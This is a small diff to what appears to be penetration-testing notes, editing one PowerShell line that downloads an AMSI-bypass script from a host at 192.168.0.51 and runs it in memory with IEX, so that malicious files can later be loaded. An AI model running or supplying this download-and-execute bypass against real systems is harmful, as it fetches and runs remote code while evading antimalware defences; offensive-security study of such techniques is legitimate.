@@ -47,7 +47,7 @@ PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShell
 Need to bypass AMSI to load Malicious files into memory:
 
 ```bash
-PS C:\Users\Sec-1> (New-Object System.Net.WebClient).DownloadString('http://192.168.0.51/amsi.txt') | IEX
+PS C:\users\public\downloads> (New-Object System.Net.WebClient).DownloadString('http://192.168.0.51/amsi.txt') | IEX
 ```
 
 Then load into memory:
